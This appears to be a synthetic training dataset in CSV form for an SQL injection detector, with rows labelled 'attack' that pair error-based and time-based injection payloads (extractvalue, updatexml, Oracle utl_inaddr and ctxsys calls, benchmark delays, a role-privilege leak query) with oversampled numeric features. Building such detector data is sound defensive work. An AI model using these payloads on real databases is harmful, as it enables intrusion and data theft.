id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000282,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   'bacm'  =  'bacm",nearest_attack_euclidean,R000758,0.21859955986745952,235.8329246230803,32.0,3.7434604867544676,77.0,37.0,94.26633969846422,27.566584924616055,0.3266194175810738,0.15694699286363287,0.39957307766683936,0.11686051188845394,4.0,0.0,0.0,0.0,0.0,2.0,0.0,16.566584924616055,0.0,0.0,5.0,2.0000000000000004,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000283,attack,error,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'fdoc' like 'fdoc",nearest_attack_euclidean,R000645,0.2346522197242526,341.0863774369338,39.617275487386756,3.9121476633680783,114.0,55.0,133.46910194954702,38.617275487386756,0.33428682048042535,0.16127872917915256,0.3912317300441115,0.11320272029631062,4.0,0.0,0.0,0.0,2.0,1.0,0.0,24.617275487386756,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000284,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000445,1.1255156635407548,337.6433847315872,34.3150070088528,3.5520902930711102,87.57503504426403,49.0,143.7533426784704,57.3150070088528,0.2589329035824045,0.1452741650535908,0.42600815127746433,0.16978478008654038,2.3150070088528043,0.0,0.0,0.0,0.0,2.0,0.0,30.0,0.0,0.0,1.0,22.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.4383356696176013,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.438335669617602
SMOTE_000285,attack,error,"1  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000684,0.611045615955006,143.04912085111812,25.47543957444094,3.6416702484950334,34.71315936166141,38.04912085111812,52.52456042555906,17.76228021277953,0.24280877178279897,0.26588083776624016,0.36715938969103395,0.1241510007599269,0.0,0.23771978722047005,0.0,0.0,0.0,1.0,0.0,10.76228021277953,0.0,0.0,5.76228021277953,1.0000000000000004,0.0,0.23771978722047007,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0000000000000004
SMOTE_000286,attack,error,select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000188,0.006724467045521394,133.0,28.0,3.7251293330652513,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000287,attack,error,1  )   where 6116  =  6116 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000703,1.6301436098463749,341.98577959178954,33.40284408164209,3.561512358821229,89.79146775507374,51.12954122447722,143.5323853061193,57.53238530611931,0.2623969164670017,0.1494515001713853,0.41987243459171575,0.16827914876989725,0.0,0.0,2.0,0.0,0.0,2.5323853061193047,0.0,29.467614693880694,0.0,1.5971559183579145,0.4676146938806949,24.53238530611931,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.5323853061193047,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.532385306119305
SMOTE_000288,attack,error,"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000575,0.09814248349141563,170.06274153737377,26.0,3.4051014773599073,43.0,32.0,73.85019322989902,21.212548307474755,0.252883837104432,0.1881926229614378,0.4342005891187053,0.1247229508154249,0.0,0.0,0.0,0.0,1.0,1.0,0.0,14.212548307474755,0.0,0.0,4.0,2.0000000000000004,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000289,attack,error,"1',exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000527,1.1740124889156907,175.23851908728528,28.950598356225225,3.506888420685289,46.06985789986786,32.0,73.85179506867567,23.316866118741743,0.26129772537926954,0.18343729295420158,0.4217776339943403,0.13348734767218856,1.0,0.0,0.0,0.0,1.0,1.0,0.0,14.316866118741741,0.0,0.0,4.683133881258258,2.0000000000000004,1.0,0.0,0.0,0.3168661187417416,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.31686611874174153,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.316866118741742
SMOTE_000290,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000174,0.21931585392762623,169.7009124299891,27.099695856670298,3.447416249196177,42.800608286659404,32.0,72.8006082866594,22.099695856670298,0.25220021747948457,0.18857241290032928,0.42898685457354324,0.13024051504664286,1.0,0.0,0.0,0.0,1.0,1.0,0.0,14.0,0.0,0.0,4.099695856670299,2.0000000000000004,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.1102230246251565e-16,0.900304143329701,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.900304143329701
SMOTE_000291,attack,error,"1  )   where 9059  =  9059 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000530,0.4002663589647434,169.35556484999046,30.258336818746415,3.8165976072140726,44.51667363749283,43.0,61.838891212497614,20.0,0.2625963890085934,0.2540406699712786,0.3652044898706961,0.11815845114943191,0.0,0.0,2.0,0.0,0.0,2.0,0.0,11.0,0.0,0.0,5.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000292,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",nearest_attack_euclidean,R000403,0.20582183536000556,312.1362853709806,37.136285370980616,4.0282511962565115,109.54514148392248,55.0,112.72742925803877,34.863714629019384,0.35094852377270136,0.17620529516461936,0.3611509552058991,0.11169522585678018,4.0,0.0,0.0,0.0,2.0,1.8637146290193805,0.0,20.0,0.0,0.0,6.0,4.8637146290193805,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000293,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000412,0.28086604850984004,140.38307395536077,24.0,3.5544801827043724,36.0,35.0,52.90645916428863,16.47661479107216,0.2565222123039937,0.24939659529554947,0.37673834969841036,0.11734284270204648,0.0,0.0,0.0,0.0,0.0,1.0,0.0,10.476614791072157,0.0,0.0,5.0,1.0000000000000004,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0000000000000004
SMOTE_000294,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000012,0.0,254.0,44.0,4.466677692316377,148.0,2.0,77.0,27.0,0.5826771653543307,0.00787401574803151,0.3031496062992126,0.1062992125984252,3.0,0.0,0.0,0.0,0.0,4.0,0.0,10.0,0.0,7.0,1.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000295,attack,error,"1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  1185  =  1185",nearest_attack_euclidean,R000722,0.1332457112345892,167.4591569830231,26.104225498787365,3.562612808920779,38.68732350363791,43.41690199514945,66.04225498787363,19.31267649636209,0.2312981452230921,0.2592524090001612,0.3941823669374338,0.11526707883931286,0.0,0.0,0.0,0.0,0.0,2.0,0.0,12.208450997574726,0.0,0.0,5.104225498787364,2.0000000000000004,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000296,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000445,1.3128107717436959,337.10953493099436,33.82813953918131,3.520965890131022,86.38290700467849,49.0,144.89848838713456,56.82813953918131,0.2559034944958537,0.14550202777335608,0.42994033302072243,0.1686541447100678,1.0,0.0,0.0,0.0,0.0,2.0,0.0,30.414069769590654,0.0,0.0,1.0,22.0,1.0,0.0,0.0,0.4140697695906533,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000297,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'gfll'  =  'gfll",nearest_attack_euclidean,R000624,0.053973152477195085,243.0,31.748823742748545,3.6997150479787013,77.0,37.0,100.0,29.0,0.3168724279835391,0.1522633744855967,0.411522633744856,0.11934156378600823,4.0,0.0,0.0,0.0,0.0,2.0,0.0,18.0,0.0,0.0,5.0,2.0000000000000004,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000298,attack,error,select   (  case when   (  7997  =  1543  )   then 7997 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000202,0.006188448661210245,133.0,29.0,3.73635757982547,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000299,attack,error,"1""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""ghdr"" like ""ghdr",nearest_attack_euclidean,R000709,0.5501449771593586,179.67302646243215,30.0,3.764362796697841,48.0,39.0,68.4340226820847,24.23900378034745,0.26754211252736704,0.21737796642848572,0.38018534105984264,0.13489457998430454,0.0,4.0,0.0,0.0,0.0,1.0,0.0,13.23900378034745,0.0,0.0,6.0,1.0000000000000004,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000300,attack,error,"1""   )    )    as tsry where 6594  =  6594 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000559,1.1744477358049092,332.5078963457232,39.507896345723225,3.9859960001210677,109.0,63.0,125.0,35.507896345723225,0.3278125049596238,0.1894696129583147,0.3759317717426878,0.1067861103393737,0.0,0.5078963457232275,2.0,0.0,2.0,2.0,0.0,22.0,0.0,0.0,6.0,7.0,0.0,0.5078963457232277,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000301,attack,error,"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # rhli",nearest_attack_euclidean,R000635,0.4089478812500571,332.13312736339924,33.0,3.519902695066613,86.38699621856125,48.306501890719375,141.61300378143875,55.82662547267984,0.2601585174951656,0.1454217194829249,0.4263357233415093,0.1680840396804002,0.0,0.0,0.0,0.0,0.0,2.0,0.0,29.653250945359687,0.0,0.5201235819604704,0.8266254726798432,22.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000302,attack,error,"1%'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  '%'  =  '",nearest_attack_euclidean,R000352,0.010471228154953428,316.8506580347552,39.0,3.9576989457355016,102.0,55.0,120.88052642780417,38.97013160695104,0.3219230867606014,0.17358597815522625,0.3814999872112182,0.12299094787295417,4.0,0.0,0.0,0.0,2.0,2.0,0.0,21.970131606951043,2.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000303,attack,error,"1'||  (  select 'kbvq' where 9279  =  9279 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000345,0.277147407682667,187.88690401833665,32.886904018336644,3.923612107723941,51.886904018336644,43.0,66.0,27.0,0.27615823604772394,0.22886173419079314,0.35127615015331043,0.14370387960817246,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,0.8869040183366433,0.1130959816633566,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000304,attack,error,"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",nearest_attack_euclidean,R000329,1.0508840873026004,290.57035173125394,36.57035173125392,3.9459235154039485,98.57035173125392,55.0,107.0,30.0,0.33922867084252584,0.18928345366490146,0.3682423553117174,0.10324552018085534,0.0,0.0,0.0,0.0,2.0,1.0,0.0,20.0,0.0,0.0,6.0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,0.5703517312539246,0.42964826874607537,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.0
SMOTE_000305,attack,error,"1'||  (  select 'ysij' from dual where 6140  =  6140 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'",nearest_attack_euclidean,R000431,0.7645995947103098,201.12706755670422,36.794790539764584,3.999281023639232,70.3583243181167,32.0,72.58958107952917,26.179162159058347,0.34963749475781997,0.1592346191482318,0.36109387535047843,0.1300340107434698,3.5895810795291734,0.0,0.0,0.0,0.0,1.0,0.0,14.0,0.0,0.0,4.0,4.589581079529173,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.7947905397645867,1.0,0.0,1.0,0.7947905397645867,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.794790539764587
SMOTE_000306,attack,error,"1' in boolean mode  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000440,1.6760232426037391,170.42280384806,31.0,3.8264204692852464,62.884560769612,24.0,63.21140192403,20.326841154418002,0.3691341473567864,0.14094512279732202,0.37080030410245485,0.11912042574343674,2.326841154418001,0.0,0.0,0.0,0.0,0.0,0.0,13.442280384806,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.5577196151939996,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.44228038480600046,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4422803848060015
SMOTE_000307,attack,error,"1""   )    )    as vdbf where 7969  =  7969 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000045,0.07185679437315963,179.85789126647,30.885789126647,3.7397391572866847,46.65736737994101,43.0,68.31473475988201,21.885789126647,0.2593824030144892,0.23925433840780308,0.37966344648955813,0.12169981208814958,0.0,1.0,2.0,0.0,0.0,2.0,0.0,11.885789126647001,0.0,0.0,5.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
